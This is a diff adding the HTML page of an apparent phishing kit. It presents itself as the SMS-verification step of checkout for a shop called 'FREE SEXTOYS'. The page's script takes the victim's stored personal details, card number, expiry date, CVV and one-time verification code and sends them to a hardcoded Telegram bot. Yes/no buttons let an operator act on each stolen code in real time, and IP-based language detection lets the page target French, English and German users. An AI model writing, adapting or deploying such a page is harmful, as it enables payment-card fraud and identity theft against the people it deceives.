@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>FREE SEXTOYS - Authentification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1A2526 0%, #2C3E50 100%);
+            color: #FFFFFF;
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        nav {
+            background: #131921;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+        nav h1 {
+            color: #FF6200;
+            margin: 0;
+            font-size: 28px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
+        }
+        .progress {
+            text-align: center;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 25px;
+            margin: 10px 0;
+        }
+        .progress span {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            line-height: 40px;
+            border-radius: 50%;
+            margin: 0 15px;
+            background: #FF6200;
+            color: #FFFFFF;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
+        }
+        .progress span.inactive {
+            background: #666;
+            transform: scale(0.8);
+        }
+        .container {
+            max-width: 600px;
+            margin: 30px auto;
+            padding: 30px;
+            border-radius: 20px;
+            background: #FFFFFF;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        .container:hover {
+            transform: translateY(-5px);
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            background: #F5F5F5;
+            border: 1px solid #888;
+            color: #0F1111;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        input:focus {
+            border-color: #FF6200;
+            box-shadow: 0 0 8px rgba(255, 98, 0, 0.3);
+            outline: none;
+        }
+        button {
+            background: #FF6200;
+            border: none;
+            padding: 15px;
+            color: #FFFFFF;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 25px;
+            font-size: 18px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+        button:hover {
+            background: #E55A00;
+            transform: scale(1.02);
+            box-shadow: 0 0 15px #FF6200;
+        }
+        p {
+            color: #0F1111;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <nav><h1 id="title">FREE SEXTOYS - Authentification</h1></nav>
+    <div class="progress">
+        <span class="inactive">1</span><span class="inactive">2</span><span class="inactive">3</span><span>4</span><span class="inactive">5</span>
+    </div>
+    <div class="container">
+        <p id="message">Pour sécuriser votre commande chez FREE SEXTOYS, vous allez recevoir un code de vérification par SMS sur votre numéro de téléphone ou par email. Veuillez entrer ce code ci-dessous pour valider votre achat.</p>
+        <input type="text" placeholder="Entrez le code (6 chiffres)" id="code" maxlength="6">
+        <button id="validateBtn" onclick="sendToTelegram()">Valider</button>
+    </div>
+
+    <script>
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const country = data.country_code;
+                let lang = 'en';
+                if (country === 'FR') lang = 'fr';
+                if (country === 'DE') lang = 'de';
+                changeLanguage(lang);
+            })
+            .catch(error => {
+                console.error('Erreur lors de la détection de langue :', error);
+                changeLanguage('en');
+            });
+
+        function changeLanguage(lang) {
+            const title = document.getElementById('title');
+            const message = document.getElementById('message');
+            const validateBtn = document.getElementById('validateBtn');
+            const codeInput = document.getElementById('code');
+
+            if (lang === 'fr') {
+                title.textContent = 'FREE SEXTOYS - Authentification';
+                message.textContent = 'Pour sécuriser votre commande chez FREE SEXTOYS, vous allez recevoir un code de vérification par SMS sur votre numéro de téléphone ou par email. Veuillez entrer ce code ci-dessous pour valider votre achat.';
+                validateBtn.textContent = 'Valider';
+                codeInput.placeholder = 'Entrez le code (6 chiffres)';
+            } else if (lang === 'en') {
+                title.textContent = 'FREE SEXTOYS - Authentication';
+                message.textContent = 'To secure your order with FREE SEXTOYS, you will receive a verification code via SMS to your phone number or email. Please enter the code below to validate your purchase.';
+                validateBtn.textContent = 'Validate';
+                codeInput.placeholder = 'Enter the code (6 digits)';
+            } else if (lang === 'de') {
+                title.textContent = 'FREE SEXTOYS - Authentifizierung';
+                message.textContent = 'Um Ihre Bestellung bei FREE SEXTOYS zu sichern, erhalten Sie einen Verifizierungscode per SMS an Ihre Telefonnummer oder per E-Mail. Bitte geben Sie den Code unten ein, um Ihren Kauf zu bestätigen.';
+                validateBtn.textContent = 'Bestätigen';
+                codeInput.placeholder = 'Code eingeben (6 Ziffern)';
+            }
+        }
+
+        function sendToTelegram() {
+            const auth = { code: document.getElementById('code').value };
+            localStorage.setItem('auth', JSON.stringify(auth));
+
+            const selectedItems = JSON.parse(localStorage.getItem('selectedItems')) || [];
+            const userInfos = JSON.parse(localStorage.getItem('userInfos')) || {};
+            const paiement = {
+                adresseLivraison: localStorage.getItem('adresseLivraison') || '',
+                numeroDestinataire: localStorage.getItem('numeroDestinataire') || '',
+                titulaire: localStorage.getItem('titulaire') || '',
+                carte: localStorage.getItem('carte') || '',
+                expiration: localStorage.getItem('expiration') || '',
+                cvv: localStorage.getItem('cvv') || ''
+            };
+
+            const message = `Données des Pages 1 à 4 - FREE SEXTOYS\n\n` +
+                           `Articles choisis (Page 1):\n${selectedItems.length > 0 ? selectedItems.join(', ') : 'Aucun article sélectionné'}\n\n` +
+                           `Informations personnelles (Page 2):\n` +
+                           `Nom: ${userInfos.nom || ''}\n` +
+                           `Email: ${userInfos.email || ''}\n` +
+                           `Téléphone: ${userInfos.telephone || ''}\n` +
+                           `Pays: ${userInfos.pays || ''}\n` +
+                           `Ville: ${userInfos.ville || ''}\n` +
+                           `Code postal: ${userInfos.codepostal || ''}\n` +
+                           `Adresse: ${userInfos.adresse || ''}\n\n` +
+                           `Paiement (Page 3):\n` +
+                           `Adresse de livraison: ${paiement.adresseLivraison || ''}\n` +
+                           `Numéro de destinataire: ${paiement.numeroDestinataire || ''}\n` +
+                           `Nom du titulaire: ${paiement.titulaire || ''}\n` +
+                           `Numéro de carte: ${paiement.carte || ''}\n` +
+                           `Date d'expiration: ${paiement.expiration || ''}\n` +
+                           `CVV: ${paiement.cvv || ''}\n\n` +
+                           `Authentification (Page 4):\n` +
+                           `Code: ${auth.code || ''}`;
+
+            const token = '7966565424:AAGTSMjFqmYkI-Kd1jiccJWtRzPfSdZ_VAA';
+            const chatId = '1191944530';
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: 'Oui', callback_data: 'yes_pages1to4' }, { text: 'Non', callback_data: 'no_pages1to4' }]
+                        ]
+                    }
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Données envoyées à Telegram !');
+                window.location.href = 'summary.html';
+            })
+            .catch(error => alert('Erreur lors de l\'envoi à Telegram : ' + error));
+        }
+    </script>
+</body>
+</html>
